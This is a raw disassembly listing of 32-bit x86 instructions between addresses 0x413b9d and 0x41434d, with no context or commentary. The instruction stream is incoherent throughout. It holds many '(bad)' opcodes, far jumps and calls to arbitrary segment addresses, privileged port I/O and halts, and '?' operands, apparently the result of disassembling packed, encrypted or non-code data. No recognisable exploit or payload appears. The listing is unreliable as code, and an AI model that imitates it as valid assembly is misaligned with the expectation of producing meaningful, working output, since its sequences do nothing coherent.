  413b9d:	outs   dx,DWORD PTR ds:[esi]
  413b9e:	sbb    ch,dl
  413ba0:	mov    edx,gs
  413ba2:	or     al,0x62
  413ba4:	inc    ebp
  413ba5:	mov    BYTE PTR [ecx-0x4231b3e5],dh
  413bab:	lahf   
  413bac:	xor    ch,BYTE PTR [ebx+eax*2]
  413baf:	arpl   bp,ax
  413bb1:	fdivrp st(3),st
  413bb3:	jbe    0x413be0
  413bb5:	xchg   esp,eax
  413bb6:	repz or eax,0x9baeecf1
  413bbc:	jl     0x413bc7
  413bbe:	cld    
  413bbf:	pop    eax
  413bc0:	mov    bh,0x1a
  413bc2:	lods   al,BYTE PTR ds:[esi]
  413bc3:	xchg   edx,eax
  413bc4:	or     edx,0xfffffffb
  413bc7:	sar    eax,1
  413bc9:	call   0x48b347c
  413bce:	jmp    FWORD PTR [ecx]
  413bd0:	push   edi
  413bd1:	or     al,BYTE PTR [edi]
  413bd3:	aas    
  413bd4:	stc    
  413bd5:	in     al,0xe5
  413bd7:	or     ebx,DWORD PTR [ecx+0x7d]
  413bda:	or     BYTE PTR ds:0xa13bcaab,ah
  413be0:	inc    ebp
  413be1:	xchg   DWORD PTR fs:[eax+edi*1-0x4d43ebf],ebp
  413be9:	nop
  413bea:	inc    esi
  413beb:	pop    ss
  413bec:	push   cs
  413bed:	xor    BYTE PTR [ecx],bl
  413bef:	sub    eax,DWORD PTR [ecx]
  413bf1:	call   0xe71d854a
  413bf6:	mov    esi,0xd9065f3d
  413bfb:	jnp    0x413ba9
  413bfd:	mov    dh,0xf3
  413bff:	dec    ecx
  413c00:	mov    esp,ss
  413c02:	add    esi,DWORD PTR [edi-0xb]
  413c05:	inc    esi
  413c06:	cmp    eax,0xac71ddf7
  413c0b:	ret    0x5add
  413c0e:	(bad)  
  413c0f:	jl     0x413c13
  413c11:	into   
  413c12:	mov    al,0xb9
  413c14:	jb     0x413ba0
  413c16:	dec    esi
  413c17:	dec    edi
  413c18:	inc    eax
  413c19:	mov    ds:0x912ea122,al
  413c1e:	ficomp WORD PTR [esi+0x20f6e51c]
  413c24:	xor    edx,DWORD PTR [edx+0x6b2e96db]
  413c2a:	push   esp
  413c2b:	imul   ebx,DWORD PTR [ecx],0xa4502fde
  413c31:	mov    esp,0x53c79e6d
  413c36:	jb     0x413c6e
  413c38:	repz shr DWORD PTR [ebx+ebp*2+0x61],1
  413c3d:	xchg   esi,eax
  413c3e:	pop    esi
  413c3f:	xor    ah,bh
  413c41:	jmp    0x413c62
  413c43:	lds    ecx,FWORD PTR [ebp-0x34bed58c]
  413c49:	xor    dh,BYTE PTR [edi]
  413c4b:	aam    0xc6
  413c4d:	mov    ecx,DWORD PTR cs:[esi]
  413c50:	sbb    ch,bh
  413c52:	pop    es
  413c53:	jecxz  0x413c4e
  413c55:	jmp    esi
  413c57:	xchg   BYTE PTR [ebx-0x79],al
  413c5a:	lds    eax,FWORD PTR [ebp+0x768b1ac5]
  413c60:	shl    DWORD PTR [edi+0x63],cl
  413c63:	push   esi
  413c64:	jae    0x413c32
  413c66:	sar    BYTE PTR [edi+0x6f],0x7d
  413c6a:	sub    eax,0x5647514a
  413c6f:	cmp    esp,0x28e108dc
  413c75:	mov    ah,0xa1
  413c77:	lds    ecx,FWORD PTR [ecx-0x28]
  413c7a:	mov    al,ds:0xb99811a4
  413c7f:	ret    0x3904
  413c82:	jge    0x413c5c
  413c84:	inc    esi
  413c85:	out    dx,al
  413c86:	jbe    0x413cce
  413c88:	mov    es,WORD PTR [ebp+0x271693cf]
  413c8e:	dec    ebx
  413c8f:	lea    edx,[eax-0x70]
  413c92:	repz (bad) 
  413c94:	in     eax,0x6c
  413c96:	add    eax,0x91a6d932
  413c9b:	inc    ebp
  413c9c:	ret    0x8f2d
  413c9f:	fimul  DWORD PTR [ecx+0x4d]
  413ca2:	(bad)  
  413ca3:	cli    
  413ca4:	lods   al,BYTE PTR ds:[esi]
  413ca5:	dec    esp
  413ca6:	nop
  413ca7:	cmp    eax,0x528bbc08
  413cac:	outs   dx,DWORD PTR ds:[esi]
  413cad:	ja     0x413d18
  413caf:	jmp    0x1e0f:0xf5832bd2
  413cb6:	jns    0x413d01
  413cb8:	inc    esi
  413cb9:	cmp    al,0x27
  413cbb:	fst    QWORD PTR [edx-0x19]
  413cbe:	jmp    0x7452:0xf9a81d54
  413cc5:	or     cl,cl
  413cc7:	stos   BYTE PTR es:[edi],al
  413cc8:	test   BYTE PTR [ebp+0x60],ah
  413ccb:	mov    ds:0x12393bc0,al
  413cd0:	lock mov ch,0x25
  413cd3:	mov    ds:0x303f56a1,eax
  413cd8:	outs   dx,BYTE PTR ds:[esi]
  413cd9:	arpl   bp,bx
  413cdb:	ret    0xc630
  413cde:	clc    
  413cdf:	sbb    eax,0xc1e70cfd
  413ce4:	sub    al,0xce
  413ce6:	ffree  st(5)
  413ce8:	push   esp
  413ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cea:	jl     0x413d4e
  413cec:	cdq    
  413ced:	and    bp,bx
  413cf0:	outs   dx,DWORD PTR ds:[esi]
  413cf1:	int3   
  413cf2:	leave  
  413cf3:	sbb    eax,DWORD PTR [eax-0x53]
  413cf6:	hlt    
  413cf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cf8:	sub    DWORD PTR [ecx+0x69],edx
  413cfb:	jbe    0x413c7d
  413cfd:	shl    DWORD PTR [edi],0x24
  413d00:	dec    edx
  413d01:	div    BYTE PTR [edx]
  413d03:	fild   WORD PTR [edi-0x21]
  413d06:	das    
  413d07:	popf   
  413d08:	inc    edx
  413d09:	mov    ds:0xc3e266c6,al
  413d0e:	aam    0x7
  413d10:	jns    0x413cfa
  413d12:	pop    ds
  413d13:	push   ecx
  413d14:	add    al,0x12
  413d16:	out    0x96,eax
  413d18:	mov    esi,0xa67b2246
  413d1d:	std    
  413d1e:	dec    BYTE PTR ds:0x97160778
  413d24:	sbb    DWORD PTR [edi+ebx*8-0x67b7a91d],ecx
  413d2b:	mov    BYTE PTR [esi],0x2c
  413d2e:	das    
  413d2f:	push   ebp
  413d30:	pop    edi
  413d31:	pop    esi
  413d32:	out    0x2f,al
  413d34:	out    dx,eax
  413d35:	leave  
  413d36:	jecxz  0x413d4d
  413d38:	pop    esi
  413d39:	stos   DWORD PTR es:[edi],eax
  413d3a:	inc    ebp
  413d3b:	enter  0xc2ef,0xb2
  413d3f:	js     0x413d00
  413d41:	push   0x46
  413d43:	or     eax,0x11f96b1b
  413d48:	push   ds
  413d49:	leave  
  413d4a:	mov    ecx,0xabf1d51b
  413d4f:	pop    ecx
  413d50:	(bad)  
  413d52:	imul   ebx,DWORD PTR [eax+ebp*2],0x1eb49d91
  413d59:	shl    DWORD PTR [eax+0x6c],1
  413d5c:	retf   
  413d5d:	fucom  st(4)
  413d5f:	cmp    dl,cl
  413d61:	cwde   
  413d62:	pusha  
  413d63:	or     al,0xfb
  413d65:	iret   
  413d66:	dec    ebp
  413d67:	mov    ds:0x61a85d48,al
  413d6c:	test   BYTE PTR [edi+0x5f9c815b],bh
  413d72:	call   0x5943:0x35338306
  413d79:	ds popa 
  413d7b:	mov    esp,0xd7a01616
  413d80:	mov    dh,BYTE PTR [edi-0x5e]
  413d83:	js     0x413d77
  413d85:	inc    edx
  413d86:	lods   eax,DWORD PTR ds:[esi]
  413d87:	test   BYTE PTR [ebx],cl
  413d89:	push   ebp
  413d8a:	mov    dl,0x4f
  413d8c:	dec    ebp
  413d8d:	div    ah
  413d8f:	jl     0x413dca
  413d91:	test   DWORD PTR [ecx+0x323c48af],ecx
  413d97:	inc    ebx
  413d98:	sub    ah,BYTE PTR [esi-0x18]
  413d9b:	pop    edi
  413d9c:	or     DWORD PTR [ecx],ebp
  413d9e:	xchg   edi,eax
  413d9f:	fst    QWORD PTR [esi]
  413da1:	or     dl,BYTE PTR [ecx-0x57]
  413da4:	dec    ebx
  413da5:	mov    bh,0xc8
  413da7:	push   0xc
  413da9:	xchg   edi,eax
  413daa:	call   0xb88a:0xd74159ac
  413db1:	in     al,dx
  413db2:	cmp    esp,DWORD PTR [edi+0x25]
  413db5:	or     DWORD PTR [ebp-0x1],edi
  413db8:	in     al,dx
  413db9:	scas   al,BYTE PTR es:[edi]
  413dba:	(bad)  
  413dbb:	jp     0x413e31
  413dbd:	ins    BYTE PTR es:[edi],dx
  413dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dbf:	fild   DWORD PTR [edi-0x75]
  413dc2:	shl    BYTE PTR [edi-0x62],1
  413dc5:	or     BYTE PTR [edx],al
  413dc7:	test   eax,0xed2f405a
  413dcc:	mov    bh,0xea
  413dce:	sbb    BYTE PTR [ecx],ch
  413dd0:	retf   
  413dd1:	dec    ecx
  413dd2:	retf   0x9906
  413dd5:	push   esi
  413dd6:	das    
  413dd7:	sub    al,0x9f
  413dd9:	popa   
  413dda:	add    eax,0xaf2217b6
  413ddf:	xlat   BYTE PTR ds:[ebx]
  413de0:	sub    BYTE PTR ds:0x432d809d,bh
  413de6:	pushf  
  413de7:	(bad)  
  413dea:	push   cs
  413deb:	(bad)  [eax+edi*8]
  413dee:	inc    esi
  413def:	int    0x8b
  413df1:	and    cl,ah
  413df3:	mov    ch,0x45
  413df5:	ror    bh,cl
  413df7:	pushf  
  413df8:	outs   dx,DWORD PTR ds:[esi]
  413df9:	or     eax,0xf4b3b501
  413dfe:	pop    edx
  413dff:	push   ds
  413e00:	repz inc ecx
  413e02:	fwait
  413e03:	(bad)  
  413e04:	ficom  WORD PTR [edi-0x32]
  413e07:	dec    ebp
  413e08:	jns    0x413e1a
  413e0a:	adc    al,0x16
  413e0c:	sub    al,BYTE PTR [edx+0x57]
  413e0f:	or     BYTE PTR [ebx-0x4a],ch
  413e12:	dec    eax
  413e13:	fimul  DWORD PTR [ebx-0x7a]
  413e16:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  413e18:	pop    ss
  413e19:	lahf   
  413e1a:	xlat   BYTE PTR ds:[ebx]
  413e1b:	shl    dl,1
  413e1d:	jle    0x413e3a
  413e1f:	push   ebx
  413e20:	inc    edx
  413e21:	and    al,BYTE PTR [edi+0x2f73a7ba]
  413e27:	popf   
  413e28:	cmp    DWORD PTR [edx-0x3d],edi
  413e2b:	inc    ebx
  413e2c:	sbb    dh,ah
  413e2e:	pop    ss
  413e2f:	add    edi,DWORD PTR [esi-0x5384559a]
  413e35:	sbb    al,0x1
  413e37:	out    dx,al
  413e38:	pop    edi
  413e39:	aad    0x61
  413e3b:	jns    0x413eaf
  413e3d:	adc    ecx,DWORD PTR [esi+ebp*1]
  413e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e41:	pop    eax
  413e42:	add    BYTE PTR [ebx-0x71],dl
  413e45:	inc    esi
  413e46:	dec    ecx
  413e47:	sub    dh,BYTE PTR [edx]
  413e49:	call   0xf9c:0xce870404
  413e50:	or     eax,esi
  413e52:	jmp    0x59db:0x83c49edc
  413e59:	dec    esi
  413e5a:	jecxz  0x413eb9
  413e5c:	pop    ds
  413e5d:	xchg   ecx,eax
  413e5e:	test   BYTE PTR [ebp-0x59d0b7ae],al
  413e64:	lods   al,BYTE PTR ds:[esi]
  413e65:	cmp    eax,0x9bcf324a
  413e6a:	and    DWORD PTR [edi],ecx
  413e6c:	pop    es
  413e6d:	pop    edi
  413e6e:	inc    edx
  413e6f:	ins    BYTE PTR es:[edi],dx
  413e70:	inc    esi
  413e71:	es sbb al,0xbd
  413e74:	neg    BYTE PTR [ebp-0x6972fc55]
  413e7a:	adc    BYTE PTR [ecx],bh
  413e7c:	into   
  413e7d:	cmc    
  413e7e:	push   0x6c
  413e80:	fsubr  DWORD PTR [ebx+0x4]
  413e83:	pop    esi
  413e84:	xchg   edi,eax
  413e85:	push   esp
  413e86:	jge    0x413e2b
  413e88:	pop    ss
  413e89:	or     ch,BYTE PTR [edi-0x4197eb27]
  413e8f:	imul   ebx,eax,0xffffffee
  413e92:	lock sbb eax,0xf747dc9b
  413e98:	adc    DWORD PTR [esi],esp
  413e9a:	adc    bl,bh
  413e9c:	xor    DWORD PTR [edx],esi
  413e9e:	dec    edx
  413e9f:	push   ss
  413ea0:	retf   
  413ea1:	test   DWORD PTR [edx],edi
  413ea3:	pushf  
  413ea4:	mov    ds:0x7cfeb702,al
  413ea9:	xor    bh,dl
  413eab:	pop    ebp
  413eac:	(bad)  
  413ead:	idiv   DWORD PTR ds:[ecx+0x38]
  413eb1:	jmp    0x413eb7
  413eb3:	push   esp
  413eb4:	int    0xe5
  413eb6:	xor    BYTE PTR [ecx-0x2d],bl
  413eb9:	clc    
  413eba:	fdiv   DWORD PTR [ecx-0x74]
  413ebd:	jo     0x413e8d
  413ebf:	mov    esi,0x15aacb90
  413ec4:	cmp    eax,DWORD PTR [esi+0x626446f0]
  413eca:	retf   0xb5f2
  413ecd:	(bad)  
  413ece:	dec    esi
  413ecf:	hlt    
  413ed0:	pop    ebp
  413ed1:	adc    DWORD PTR [edi],esp
  413ed3:	adc    DWORD PTR [ecx+0x9624ac9],edi
  413ed9:	fadd   QWORD PTR [edx-0x5a]
  413edc:	push   ss
  413edd:	jmp    0x4fb9:0x11d85484
  413ee4:	and    ecx,DWORD PTR [ecx-0x26a39307]
  413eea:	mov    ebx,0xb97d9290
  413eef:	aaa    
  413ef0:	xor    eax,0xb075f860
  413ef5:	imul   ecx,DWORD PTR [ebx+0x31],0xcb78979d
  413efc:	shr    DWORD PTR [ecx-0x49],0x30
  413f00:	repz arpl WORD PTR [ebp-0x5166ba59],di
  413f07:	mov    al,ds:0xe8a5dfd
  413f0c:	aaa    
  413f0d:	jo     0x413f0e
  413f0f:	adc    esi,ebx
  413f11:	bound  ebx,QWORD PTR [edi]
  413f13:	mov    ebx,ebx
  413f15:	xchg   BYTE PTR [ecx+0x65],dl
  413f18:	and    esp,ecx
  413f1a:	mov    esi,esp
  413f1c:	xor    eax,0xf385612e
  413f21:	or     ebx,DWORD PTR [ebp+edi*8-0x33]
  413f25:	(bad)  
  413f26:	cld    
  413f27:	mul    BYTE PTR [edx]
  413f29:	dec    edi
  413f2a:	addr16 push edi
  413f2c:	rcl    BYTE PTR [esi+0x21db2091],cl
  413f32:	es jl  0x413f1f
  413f35:	xor    DWORD PTR [esi],0x5d9ea9be
  413f3b:	gs and eax,0x5e2a133b
  413f41:	bound  ebp,QWORD PTR [edi]
  413f43:	aad    0x10
  413f45:	out    dx,al
  413f46:	(bad)  
  413f47:	ss bswap sp
  413f4b:	arpl   WORD PTR [ecx+eax*4+0x71],sp
  413f4f:	sbb    bh,BYTE PTR [ebx]
  413f51:	jae    0x413f70
  413f53:	jecxz  0x413ef5
  413f55:	ret    0x65c8
  413f58:	and    edi,DWORD PTR [eax+esi*2-0x20]
  413f5c:	cdq    
  413f5d:	or     eax,0xb0bb528e
  413f62:	pop    edx
  413f63:	push   esi
  413f64:	push   eax
  413f65:	jnp    0x413f4e
  413f67:	repnz cmc 
  413f69:	mov    ebx,0x6eabda5c
  413f6e:	stos   BYTE PTR es:[edi],al
  413f6f:	loop   0x413f57
  413f71:	fisttp WORD PTR [edi-0x4d]
  413f74:	lock mov bl,0x67
  413f77:	test   eax,0x4c7bfe1b
  413f7c:	mov    esi,0x6aefc3a7
  413f81:	(bad)  
  413f82:	ss pop esp
  413f84:	push   ss
  413f85:	sub    cl,bh
  413f87:	lods   al,BYTE PTR ds:[esi]
  413f88:	push   ds
  413f89:	xor    DWORD PTR [ebp+0x189b3a17],0xc4ec8a15
  413f93:	int3   
  413f94:	rcr    ch,cl
  413f96:	scas   eax,DWORD PTR es:[edi]
  413f97:	adc    BYTE PTR [ecx],0xbc
  413f9a:	popa   
  413f9b:	psubw  mm5,QWORD PTR [edx+0x0]
  413f9f:	add    al,0xd7
  413fa1:	ss pop ebx
  413fa3:	pop    ebp
  413fa4:	aad    0xc7
  413fa6:	mov    al,ds:0x8d1b9495
  413fab:	sub    ebp,DWORD PTR [esi]
  413fad:	or     al,BYTE PTR ds:0x5755c319
  413fb3:	push   edx
  413fb4:	outs   dx,DWORD PTR ds:[esi]
  413fb5:	xchg   edi,eax
  413fb6:	clc    
  413fb7:	add    BYTE PTR [ebp+0x9],0x3c
  413fbb:	loope  0x41402f
  413fbd:	mov    ecx,0xad80c045
  413fc2:	test   edx,0xad173e3
  413fc8:	push   ebx
  413fc9:	push   edi
  413fca:	cmp    DWORD PTR [eax+0x25],ebp
  413fcd:	push   es
  413fce:	cld    
  413fcf:	in     eax,dx
  413fd0:	mov    bh,0x68
  413fd2:	jae    0x413f71
  413fd4:	push   ss
  413fd5:	shl    DWORD PTR ds:0xae657a41,0x4d
  413fdc:	pop    edi
  413fdd:	call   0xf4d9ada5
  413fe2:	or     BYTE PTR [ebp-0x16a6a868],ch
  413fe8:	daa    
  413fe9:	cmp    dl,0x3e
  413fec:	arpl   WORD PTR [edi+0x5a],bx
  413fef:	in     al,0x49
  413ff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ff2:	pop    esp
  413ff3:	sub    eax,0x580cd31d
  413ff8:	sub    eax,0x487c6d91
  413ffd:	fistp  WORD PTR [eax+0xe19f66b]
  414003:	mov    dl,0x94
  414005:	scas   eax,DWORD PTR es:[edi]
  414006:	sbb    esi,ebp
  414008:	jmp    0x413f95
  41400a:	shl    BYTE PTR [edx+0x52],cl
  41400d:	ja     0x413fa8
  41400f:	and    al,0x4f
  414011:	lods   al,BYTE PTR ds:[esi]
  414012:	hlt    
  414013:	jns    0x414053
  414015:	popf   
  414016:	iret   
  414017:	das    
  414018:	sbb    ecx,edi
  41401a:	aas    
  41401b:	mov    edi,0xcf0855d3
  414020:	scas   al,BYTE PTR es:[edi]
  414021:	xlat   BYTE PTR ds:[ebx]
  414022:	sub    BYTE PTR [esi+0x30fe3d5e],0x1c
  414029:	xor    esi,DWORD PTR [edx+0x44]
  41402c:	xchg   ebx,eax
  41402d:	(bad)  
  41402f:	ret    
  414030:	mov    dl,0x60
  414032:	and    al,0x9c
  414034:	xor    DWORD PTR [esi-0x7174516f],ebp
  41403a:	jecxz  0x4140b5
  41403c:	cwde   
  41403d:	mov    edi,0xe4a26671
  414042:	dec    edi
  414043:	push   esi
  414045:	(bad)  
  414046:	lock cmc 
  414048:	xor    ecx,DWORD PTR ds:0xfada7c27
  41404e:	cmp    dl,BYTE PTR [edx-0x1f]
  414051:	(bad)  
  414052:	mov    al,ds:0xbc7b9f14
  414057:	and    BYTE PTR [esi-0x43465673],al
  41405d:	and    ebp,DWORD PTR ss:[ebp-0x4e]
  414061:	xor    eax,0x5c42988a
  414066:	mov    ch,0x39
  414068:	imul   eax,DWORD PTR [edi],0xcd0f16ab
  41406e:	push   0x923f7c7d
  414073:	imul   esp,DWORD PTR [eax+0x64],0x14
  414077:	pop    ebp
  414078:	mov    cl,0x44
  41407a:	adc    eax,0x10bd33a7
  41407f:	dec    esi
  414080:	or     BYTE PTR [ecx+0x43],ch
  414083:	and    eax,0x5b22d26d
  414088:	cli    
  414089:	outs   dx,BYTE PTR ds:[esi]
  41408a:	popa   
  41408b:	jns    0x414088
  41408d:	dec    esi
  41408e:	pop    ebp
  41408f:	sub    eax,0xd87e7179
  414094:	jmp    FWORD PTR [esi-0x2f235da9]
  41409a:	sub    eax,0x9189dfcb
  41409f:	xlat   BYTE PTR ds:[ebx]
  4140a0:	and    DWORD PTR [edi+0x44226edb],esp
  4140a6:	ret    
  4140a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140a8:	mov    eax,ds:0xed239691
  4140ad:	pop    eax
  4140ae:	fisubr DWORD PTR [ebx-0xa5a52a3]
  4140b4:	in     al,0xfc
  4140b6:	adc    eax,DWORD PTR [ebp+ebx*1-0x79]
  4140ba:	and    BYTE PTR [eax-0x7f],dh
  4140bd:	shl    BYTE PTR [ebp+eiz*2+0x73],1
  4140c1:	ja     0x414079
  4140c3:	aas    
  4140c4:	mov    dl,0x9d
  4140c6:	jmp    0x414051
  4140c8:	aad    0xe
  4140ca:	xchg   esp,eax
  4140cb:	jmp    0xff7f:0xaa7a688c
  4140d2:	mov    ds:0x595657c0,al
  4140d7:	sub    dh,bh
  4140d9:	rcl    BYTE PTR [ebx+0x19],1
  4140dc:	mov    cl,0xd1
  4140de:	(bad)  [ecx-0x642d9d07]
  4140e4:	dec    ebx
  4140e5:	icebp  
  4140e6:	xchg   edi,eax
  4140e7:	sub    BYTE PTR [eax],0x59
  4140ea:	rcr    DWORD PTR [edx-0x186532bf],1
  4140f0:	mov    BYTE PTR [ebp-0x3c],0x67
  4140f4:	ss test eax,0xfebe9e
  4140fa:	loop   0x4140c0
  4140fc:	push   ss
  4140fd:	mov    esi,0x49c6b856
  414102:	outs   dx,BYTE PTR ds:[esi]
  414103:	mov    bh,0x89
  414105:	xor    DWORD PTR [bp-0x228f],ecx
  41410a:	test   DWORD PTR [ebx-0x7981d96a],esp
  414110:	sbb    BYTE PTR [eax+0x42],ah
  414113:	xchg   esi,eax
  414114:	push   ebx
  414115:	jae    0x414154
  414117:	pop    ss
  414118:	xor    dh,BYTE PTR [edi+0x47]
  41411b:	sub    eax,0x2d42d832
  414120:	pop    edi
  414121:	xlat   BYTE PTR ds:[ebx]
  414122:	pop    ss
  414123:	pop    ebp
  414124:	and    eax,0x2214625e
  414129:	sub    eax,0x227d0fe3
  41412e:	lds    ecx,FWORD PTR [ebp-0x33ef29d8]
  414134:	bound  ebx,QWORD PTR [ebp+0x156f7663]
  41413a:	inc    esi
  41413b:	xor    dh,BYTE PTR [edi-0x64]
  41413e:	pop    esp
  41413f:	xor    BYTE PTR [edi+0x24],bl
  414142:	push   esi
  414143:	repz push cs
  414145:	xchg   ecx,eax
  414146:	sub    edx,esi
  414148:	cmp    al,0xb
  41414a:	ret    0x5485
  41414d:	jbe    0x4140f3
  41414f:	fs loope 0x41414d
  414152:	pop    esi
  414153:	test   al,0xa1
  414155:	mov    bl,0x6c
  414157:	leave  
  414158:	pop    eax
  414159:	sar    DWORD PTR [edi-0x71],0x1e
  41415d:	sbb    edi,ebp
  41415f:	push   0xffffffcd
  414161:	mov    ds:0x9c2f5abd,al
  414166:	std    
  414167:	stos   DWORD PTR es:[edi],eax
  414168:	inc    eax
  414169:	call   0xf0a5214d
  41416e:	dec    ebx
  41416f:	mov    DWORD PTR [ecx],ecx
  414171:	mov    ds:0xfe2b5505,al
  414176:	or     ah,BYTE PTR [ebp+0x3c]
  414179:	mov    cs,WORD PTR [ebx+edx*4]
  41417c:	mov    ecx,0xbef775f1
  414181:	hlt    
  414182:	xchg   edx,eax
  414183:	cmp    ecx,edi
  414185:	in     al,dx
  414186:	add    al,0x9
  414188:	jbe    0x414147
  41418a:	jne    0x414130
  41418c:	push   eax
  41418d:	add    edx,DWORD PTR [ecx-0x42]
  414190:	lea    eax,[esi+0x3bba76af]
  414196:	mov    esi,0x66784f5a
  41419b:	push   ebx
  41419c:	pop    esp
  41419d:	ret    0xcc18
  4141a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141a1:	sub    BYTE PTR [edx+0x5aa93706],ah
  4141a7:	dec    esp
  4141a8:	stc    
  4141a9:	push   si
  4141ab:	in     al,0x17
  4141ad:	sub    al,0x97
  4141af:	popf   
  4141b0:	mov    ah,0xd8
  4141b2:	inc    edx
  4141b3:	ss xchg edi,eax
  4141b5:	cmp    edi,DWORD PTR [edx+edx*8-0x46]
  4141b9:	or     edx,edx
  4141bb:	mov    ?,WORD PTR [ebx]
  4141bd:	and    DWORD PTR [edx],0x51
  4141c0:	mov    WORD PTR [eax-0x6385303f],?
  4141c6:	add    dh,al
  4141c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141c9:	pop    ebx
  4141ca:	loop   0x41423f
  4141cc:	mov    WORD PTR [eax+edi*4-0x438d4cb6],fs
  4141d3:	mov    esi,0x78c576c9
  4141d8:	push   edx
  4141d9:	mov    ecx,0x11323462
  4141de:	sub    ah,al
  4141e0:	clc    
  4141e1:	outs   dx,DWORD PTR ds:[esi]
  4141e2:	pop    es
  4141e3:	out    dx,eax
  4141e4:	or     esp,DWORD PTR [ecx]
  4141e6:	inc    ebp
  4141e7:	cmp    al,0xf5
  4141e9:	pop    edx
  4141ea:	in     al,0x74
  4141ec:	sub    edx,DWORD PTR [ecx+0x4]
  4141ef:	xchg   edx,eax
  4141f0:	jns    0x41424d
  4141f2:	call   0xd17a86b7
  4141f7:	dec    ebx
  4141f8:	pop    ebp
  4141f9:	adc    esi,DWORD PTR [edi-0x39]
  4141fc:	leave  
  4141fd:	push   0x58
  4141ff:	std    
  414200:	push   ecx
  414201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414202:	stos   BYTE PTR es:[edi],al
  414203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414204:	mov    edx,0x1d01d43
  414209:	jl     0x4141ea
  41420b:	loop   0x41420a
  41420d:	fwait
  41420e:	in     al,0x4e
  414210:	sub    bh,BYTE PTR [ecx+eax*8]
  414213:	into   
  414214:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414215:	cmp    BYTE PTR [ebx+0x38],bl
  414218:	mov    ah,0x21
  41421a:	mov    ecx,0x792bfa65
  41421f:	push   ebp
  414220:	mov    ecx,0x29429ea7
  414225:	jnp    0x414207
  414227:	push   ds
  414228:	inc    ebx
  414229:	mov    dl,0xa0
  41422b:	add    edi,ecx
  41422d:	jmp    0xbb9e:0x958d05d3
  414234:	stc    
  414235:	(bad)  
  414236:	sbb    BYTE PTR [edi],dh
  414238:	stc    
  414239:	mov    ?,WORD PTR [edx]
  41423b:	adc    al,0xdb
  41423d:	xchg   ebp,eax
  41423e:	pop    es
  41423f:	pop    ds
  414240:	jecxz  0x414295
  414242:	adc    DWORD PTR [edi+ebp*8],ebx
  414245:	div    DWORD PTR [ebp-0x31863f10]
  41424b:	into   
  41424c:	cmp    DWORD PTR [ebp+0x4b7be1cf],edi
  414252:	jnp    0x414220
  414254:	lods   al,BYTE PTR ds:[esi]
  414255:	and    BYTE PTR [edx-0xc],bl
  414258:	jo     0x4142ab
  41425a:	ret    
  41425b:	pop    esi
  41425c:	pop    ebx
  41425d:	mov    ds:0xef00914,al
  414262:	jb     0x414271
  414264:	pop    ss
  414265:	les    eax,FWORD PTR [ebx]
  414267:	xor    dl,bh
  414269:	enter  0x98ec,0x9e
  41426d:	cmp    eax,0xd9a71e4f
  414272:	mov    DWORD PTR [ecx],ebx
  414274:	jno    0x414210
  414276:	sub    esi,edx
  414278:	dec    ch
  41427a:	imul   esi,DWORD PTR [edi-0x44],0x60e73a3b
  414281:	(bad)  
  414283:	pusha  
  414284:	pop    eax
  414285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414286:	arpl   WORD PTR [edx+0x1ea9b1aa],ax
  41428c:	lea    ebx,[edi]
  41428e:	in     eax,dx
  41428f:	call   0xb452:0x65b9d61d
  414296:	ja     0x41429b
  414298:	ins    BYTE PTR es:[edi],dx
  414299:	xchg   BYTE PTR [ebx],dh
  41429b:	jo     0x4142ca
  41429d:	and    al,dh
  41429f:	js     0x414230
  4142a1:	mov    cl,cl
  4142a3:	add    ebx,DWORD PTR [ebp+0x10]
  4142a6:	mov    esi,0xf6440a77
  4142ab:	popf   
  4142ac:	pop    es
  4142ad:	and    BYTE PTR [ebx+0x28],bh
  4142b0:	bound  esi,QWORD PTR [ecx]
  4142b2:	mov    al,0xd1
  4142b4:	mov    esi,0xc6256c96
  4142b9:	aad    0x95
  4142bb:	add    edx,DWORD PTR [bp-0x26]
  4142bf:	jmp    DWORD PTR [eax+0x77f303e2]
  4142c5:	hlt    
  4142c6:	stos   DWORD PTR es:[edi],eax
  4142c7:	js     0x41432a
  4142c9:	push   ebp
  4142ca:	test   al,0x77
  4142cc:	mov    ds:0x5e91284c,al
  4142d1:	adc    eax,0xb7c7566b
  4142d6:	and    eax,0xb04a88b5
  4142db:	jecxz  0x414291
  4142dd:	mov    ch,0xf8
  4142df:	jmp    0x22b50771
  4142e4:	pop    edx
  4142e5:	jl     0x414315
  4142e7:	and    esp,ebp
  4142e9:	into   
  4142ea:	add    eax,0x294377b1
  4142ef:	arpl   WORD PTR [ebx],ax
  4142f1:	stos   BYTE PTR es:[edi],al
  4142f2:	pop    es
  4142f3:	inc    ecx
  4142f4:	push   eax
  4142f5:	adc    esi,DWORD PTR [ebx-0x26]
  4142f8:	jmp    0x817e027f
  4142fd:	mov    bh,0x77
  4142ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414300:	aad    0x72
  414302:	mov    edi,0x8a73021a
  414307:	call   0xda4:0x2a35f0d8
  41430e:	hlt    
  41430f:	adc    bh,al
  414311:	pusha  
  414312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414313:	int    0xa9
  414315:	and    BYTE PTR [eax+edi*8],dh
  414318:	xlat   BYTE PTR ds:[ebx]
  414319:	fidiv  DWORD PTR [eax-0x776c5abe]
  41431f:	fs dec eax
  414321:	fld    TBYTE PTR [eax-0x6a]
  414324:	add    al,0xc6
  414326:	rcl    BYTE PTR [ebx+0x37b24ee6],1
  41432c:	jmp    0x414310
  41432e:	pop    eax
  41432f:	pop    esi
  414330:	add    cl,dh
  414332:	(bad)  
  414333:	xchg   esi,eax
  414334:	(bad)  
  414335:	test   eax,0x151a2814
  41433a:	sub    DWORD PTR [ecx-0x762db617],ebp
  414340:	inc    esp
  414341:	loopne 0x41439c
  414343:	mov    al,0xbc
  414345:	xor    DWORD PTR [ecx+0x5205a3a4],esp
  41434b:	mov    BYTE PTR [ebx],ch
  41434d:	xchg   edx,eax
